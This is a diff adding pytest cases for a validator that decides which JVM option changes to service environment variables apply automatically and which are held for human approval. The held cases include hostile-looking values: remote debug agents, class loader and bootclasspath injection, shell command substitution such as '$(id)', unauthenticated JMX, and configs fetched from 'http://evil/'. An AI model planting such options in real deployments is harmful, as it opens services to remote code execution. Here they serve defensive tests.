@@ -59,6 +59,85 @@ def test_judge(patch, verdict):
     assert judge(patch, DECLARED)[0] == verdict
 
 
+JVM_DECLARED = {"web": {"JAVA_OPTS", "JAVA_TOOL_OPTIONS", "KAFKA_HEAP_OPTS", "APP_MODE"}}
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "-Xmx512m",
+        "-Xmx256m -Xms256m",
+        "-Xss1m -Xmn128m",
+        "-XX:+UseG1GC -XX:-UseAdaptiveSizePolicy",
+        "-XX:MaxRAMPercentage=75.0 -XX:MaxMetaspaceSize=256m",
+        "-Dspring.profiles.active=local,debug -Dserver.port=8080",
+        "-Dfile.encoding=UTF-8 -Duser.timezone=UTC",
+        "  -Xmx1g  ",
+    ],
+)
+def test_judge_applies_tuning_options(value):
+    assert judge([op("replace", "/services/web/environment/JAVA_OPTS", value)], JVM_DECLARED) == (
+        "apply",
+        [],
+    )
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "-Xrunjdwp:transport=dt_socket,server=y",
+        "-Xdebug",
+        "-agentlib:jdwp=transport=dt_socket",
+        "-Xbootclasspath/a:/tmp/x.jar",
+        "-Djava.system.class.loader=evil.Loader",
+        "-Dloader.path=/tmp/lib",
+        "@/tmp/args",
+        "-Xmx1g @argfile",
+        "-cp /tmp/x.jar",
+        "-XX:Flags=/tmp/.hotspotrc",
+        "-XX:VMOptionsFile=/tmp/opts",
+        "-XX:OnOutOfMemoryError=sh",
+        "-XX:+OnError",
+        "-Dx=$(id)",
+        "-Dx=`id`",
+        "-Xmx1g;id",
+        "-Dcom.sun.management.jmxremote.port=9010",
+        "-Dcom.sun.management.jmxremote.authenticate=false",
+        "-Dlogging.config=http://evil/x.xml",
+        "-Dlogback.configurationFile=http://evil/x.xml",
+        "-Dlog4j.configurationFile=http://evil/x.xml",
+        "-Dspring.config.import=http://evil/",
+        "-Dspring.profiles.active=http://evil/",
+        "-Dserver.port=8080/x",
+        "-Dspring.profiles.active",
+    ],
+)
+def test_judge_holds_other_jvm_options_for_approval(value):
+    for key in ("JAVA_OPTS", "JAVA_TOOL_OPTIONS", "KAFKA_HEAP_OPTS"):
+        verdict, reasons = judge(
+            [op("replace", f"/services/web/environment/{key}", value)], JVM_DECLARED
+        )
+        assert verdict == "approve", (key, value)
+        assert any("JVM option" in r for r in reasons), reasons
+
+
+@pytest.mark.parametrize(
+    "patch",
+    [
+        [op("replace", "/services/web/environment", {"JAVA_OPTS": "-Xdebug"})],
+        [op("replace", "/services/web/environment", ["JAVA_OPTS=-Xbootclasspath/a:/x"])],
+        [op("add", "/services/web/environment/-", "JAVA_TOOL_OPTIONS=@/tmp/args")],
+    ],
+)
+def test_judge_reads_jvm_options_in_every_environment_shape(patch):
+    assert judge(patch, JVM_DECLARED)[0] == "approve"
+
+
+def test_judge_leaves_ordinary_values_alone():
+    patch = [op("replace", "/services/web/environment/APP_MODE", "@home -Xdebug")]
+    assert judge(patch, JVM_DECLARED) == ("apply", [])
+
+
 def test_judge_explains_approvals():
     _, reasons = judge([op("add", "/services/web/environment/FEATURE_FLAG", "on")], DECLARED)
     assert reasons == ["web: FEATURE_FLAG is not a declared environment key"]
